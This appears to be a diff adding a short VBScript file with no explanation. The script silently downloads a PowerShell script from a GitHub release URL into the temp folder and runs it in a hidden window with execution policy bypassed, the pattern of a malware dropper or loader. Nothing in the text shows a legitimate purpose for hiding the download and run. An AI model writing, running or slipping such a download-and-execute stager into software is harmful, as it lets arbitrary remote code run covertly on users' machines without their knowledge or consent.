@@ -1,0 +1,16 @@
+Dim objShell, tempFolder, strFileURL, strHDLocation, curlCommand
+
+strFileURL = "https://github.com/Y-GM/RPG/releases/download/pop1/Y-GM.ps1"
+
+Set objShell = CreateObject("WScript.Shell")
+tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+
+strHDLocation = tempFolder & "\Y-GM.ps1"
+
+curlCommand = "cmd /c curl -L -o " & Chr(34) & strHDLocation & Chr(34) & " " & Chr(34) & strFileURL & Chr(34)
+
+objShell.Run curlCommand, 0, True
+
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & strHDLocation, 0, False
+
+Set objShell = Nothing
